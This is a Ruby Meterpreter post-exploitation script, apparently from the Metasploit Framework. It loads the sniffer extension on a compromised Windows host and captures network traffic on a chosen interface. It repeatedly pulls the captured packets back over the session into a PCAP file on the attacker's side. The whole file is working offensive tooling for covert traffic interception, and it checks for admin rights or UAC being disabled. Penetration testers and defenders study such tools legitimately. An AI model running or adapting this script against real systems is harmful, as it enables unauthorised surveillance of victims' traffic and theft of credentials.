# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

@client = client

# Interval for recording packets
rec_time = 30

# Interface ID
int_id = nil

# List Interfaces
list_int = nil

# Log Folder
log_dest = nil
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false, "Help menu."],
  "-t"  => [ true,  "Time interval in seconds between recollection of packet, default 30 seconds."],
  "-i"  => [ true,  "Interface ID number where all packet capture will be done."],
  "-li" => [ false, "List interfaces that can be used for capture."],
  "-l"  => [ true,  "Specify and alternate folder to save PCAP file."]
)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
  print_line "Meterpreter Script for capturing packets in to a PCAP file"
  print_line "on a target host given a interface ID."
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
  print_error("#{meter} version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end

# Function for creating log folder and returning log pa
#-------------------------------------------------------------------------------
def log_file(log_path = nil)
  #Get hostname
  host = @client.sys.config.sysinfo["Computer"]

  # Create Filename info to be appended to downloaded files
  filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

  # Create a directory for the logs
  if log_path
    logs = ::File.join(log_path, 'logs', 'packetrecorder', host + filenameinfo )
  else
    logs = ::File.join(Msf::Config.log_directory, "scripts", 'packetrecorder', host + filenameinfo )
  end

  # Create the log directory
  ::FileUtils.mkdir_p(logs)

  #logfile name
  logfile = logs + ::File::Separator + host + filenameinfo + ".cap"
  return Rex::FileUtils.clean_path(logfile)
end

#Function for Starting Capture
#-------------------------------------------------------------------------------
def startsniff(interface_id)
  begin
    #Load Sniffer module
    @client.core.use("sniffer")
    print_status("Starting Packet capture on interface #{interface_id}")
    #starting packet capture with a buffer size of 200,000 packets
    @client.sniffer.capture_start(interface_id, 200000)
    print_good("Packet capture started")
  rescue ::Exception => e
    print_status("Error Starting Packet Capture: #{e.class} #{e}")
    raise Rex::Script::Completed
  end
end

#Function for Recording captured packets into PCAP file
#-------------------------------------------------------------------------------
def packetrecord(packtime, logfile,intid)
  begin
    rec = 1
    print_status("Packets being saved in to #{logfile}")
    print_status("Packet capture interval is #{packtime} Seconds")
    #Inserting Packets every number of seconds specified
    while rec == 1
      path_cap = logfile
      path_raw = logfile + '.raw'
      fd = ::File.new(path_raw, 'wb+')
      #Flushing Buffers
      res = @client.sniffer.capture_dump(intid)
      bytes_all = res[:bytes] || 0
      bytes_got = 0
      bytes_pct = 0
      while (bytes_all > 0)
        res = @client.sniffer.capture_dump_read(intid,1024*512)
        bytes_got += res[:bytes]
        pct = ((bytes_got.to_f / bytes_all.to_f) * 100).to_i
        if(pct > bytes_pct)
          bytes_pct = pct
        end
        break if res[:bytes] == 0
        fd.write(res[:data])
      end

      fd.close
      #Converting raw file to PCAP
      fd = nil
      if(::File.exist?(path_cap))
        fd = ::File.new(path_cap, 'ab+')
      else
        fd = ::File.new(path_cap, 'wb+')
        fd.write([0xa1b2c3d4, 2, 4, 0, 0, 65536, 1].pack('NnnNNNN'))
      end
      od = ::File.new(path_raw, 'rb')

      # TODO: reorder packets based on the ID (only an issue if the buffer wraps)
      while(true)
        buf = od.read(20)
        break if not buf

        idh,idl,thi,tlo,len = buf.unpack('N5')
        break if not len
        if(len > 10000)
          print_error("Corrupted packet data (length:#{len})")
          break
        end

        pkt_ts = Rex::Proto::SMB::Utils.time_smb_to_unix(thi,tlo)
        pkt    = od.read(len)
        fd.write([pkt_ts,0,len,len].pack('NNNN')+pkt)
      end
      od.close
      fd.close

      ::File.unlink(path_raw)
      sleep(2)
      sleep(packtime.to_i)

  end
  rescue::Exception => e
    print("\n")
    print_status("#{e.class} #{e}")
    print_good("Stopping Packet sniffer...")
    @client.sniffer.capture_stop(intid)
  end
end

# Function for listing interfaces
# ------------------------------------------------------------------------------
def int_list()
  begin
    @client.core.use("sniffer")
    ifaces = @client.sniffer.interfaces()

    print_line()

    ifaces.each do |i|
      print_line(sprintf("%d - '%s' ( type:%d mtu:%d usable:%s dhcp:%s wifi:%s )",
          i['idx'], i['description'],
          i['type'], i['mtu'], i['usable'], i['dhcp'], i['wireless'])
      )
    end

    print_line()
  rescue ::Exception => e
    print_error("Error listing interface: #{e.class} #{e}")
  end
  raise Rex::Script::Completed
end

################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-i"
    int_id = val.to_i
  when "-l"
    log_dest = val
  when "-li"
    list_int = 1
  when "-t"
    rec_time = val
  end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i

if !int_id.nil? or !list_int.nil?
  if not is_uac_enabled? or is_admin?
    if !list_int.nil?
      int_list
    else
      pcap_file = log_file(log_dest)
      startsniff(int_id)
      packetrecord(rec_time,pcap_file,int_id)
    end
  else
    print_error("Access denied (UAC enabled?)")
  end
else
  usage
end
